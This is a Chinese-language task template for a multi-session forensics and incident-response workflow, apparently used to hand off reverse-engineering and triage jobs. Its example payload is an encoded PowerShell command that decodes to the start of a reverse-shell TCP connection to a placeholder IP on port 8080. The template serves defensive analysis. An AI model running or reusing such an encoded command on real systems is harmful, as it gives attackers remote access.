# TASK: [任務代號_簡短名稱]

## 1. 任務基本資訊
- **所屬大題**：`C00_Template`
- **關聯小題**：例如 `Q03, Q04`
- **任務類型**：`DISCOVERY` / `TRIAGE` / `VERIFY` / `REVERSE` / `REVIEW`
- **Target Role**：`ROLE_01_TRIAGE_HUNTER` / `ROLE_02_REVERSE_ENGINEER` / `ROLE_03_DEVILS_ADVOCATE`
- **Assignee Session**：`Session-...`（必填且唯一）
- **發起 Session**：`Session-Main`
- **發起時間**：`YYYY-MM-DD HH:MM:SS UTC`
- **期望技能**：`[代碼逆向 / 去混淆]` / `[海量日誌過濾]` / `[封包解構]` / `[第二意見審查]`
- **Task ID**：`T000`

---

## 2. 案情背景與目標
*(簡述目前遇到的瓶頸與需要輔助 Session 協助解答的具體問題)*
> 例如：在受害主機的排程任務中發現一段 Base64 編碼的 PowerShell 指令，請協助還原其真實執行的 Payload、解出連線網址與寫入的檔案路徑。

---

## 3. 待分析資料片段 (Context Payload)
*(直接附上文字、日誌片段、Base64 字串或十六進位 Hex，切勿上傳二進位大檔)*

```text
powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMgAwADMALgAwAC4AMQAxADMALgAxADAAIgAsADgAMAA4ADAAKQA7AA==
```

---

## 4. 接單 Session 輸出規範
請支援 Session 在完成後：
1. **不得修改本 task 檔案**；發布後 task 為 immutable，由 Main 保有唯一寫入權。
2. `DISCOVERY` / `TRIAGE` / `VERIFY` / `REVERSE` 在 `findings/` 新增對應 `FINDING_[任務代號].md`。
3. `REVIEW` 在 `reviews/` 新增對應 `REVIEW_[任務代號].md`。
4. 若為 `VERIFY` 且既有候選皆不成立，必須明確回報「皆非」並附上反證，不可為了符合題目而硬選 A/B/C。
